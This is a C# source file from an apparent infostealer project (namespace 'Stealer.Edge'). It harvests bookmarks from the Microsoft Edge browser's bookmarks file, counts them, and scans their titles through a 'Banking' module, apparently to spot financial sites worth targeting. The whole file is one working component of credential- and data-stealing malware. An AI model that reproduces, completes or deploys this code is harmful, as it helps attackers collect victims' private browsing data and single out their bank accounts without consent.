using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Stealer.Edge
{
   
    internal sealed class Bookmarks
    {
        /// <summary>
        /// Get bookmarks from edge browser
        /// </summary>
        /// <param name="sBookmarks"></param>
        /// <returns>List with bookmarks</returns>
        public static List<Bookmark> Get(string sBookmarks)
        {
            try
            {
                List<Bookmark> bBookmarks = new List<Bookmark>();


                if (!File.Exists(sBookmarks))
                    return bBookmarks;

                string data = File.ReadAllText(sBookmarks, System.Text.Encoding.UTF8); // Load file content

                data = Regex.Split(data, "      \"bookmark_bar\": {")[1];
                data = Regex.Split(data, "      \"other\": {")[0];


                string[] payload = Regex.Split(data, "},");
                foreach (string parse in payload)
                    if (parse.Contains("\"name\": \"") &&
                        parse.Contains("\"type\": \"url\",") &&
                        parse.Contains("\"url\": \"http")
                    )
                    {
                        int index = 0;
                        foreach (string target in Regex.Split(parse, Chromium.Parser.separator))
                        {
                            index++;
                            Bookmark bBookmark = new Bookmark();
                            if (Chromium.Parser.DetectTitle(target))
                            {
                                bBookmark.sTitle = Chromium.Parser.Get(parse, index);
                                bBookmark.sUrl = Chromium.Parser.Get(parse, index + 3);

                                if (string.IsNullOrEmpty(bBookmark.sTitle))
                                    continue;
                                if (!string.IsNullOrEmpty(bBookmark.sUrl) && !bBookmark.sUrl.Contains("Failed to parse url"))
                                {
                                    // Analyze value
                                    Banking.ScanData(bBookmark.sTitle);
                                    Counter.Bookmarks++;
                                    bBookmarks.Add(bBookmark);
                                }
                            }
                                

                        }

                    }
                return bBookmarks;
            }
            catch { return new List<Bookmark>(); }
        }

    }
}
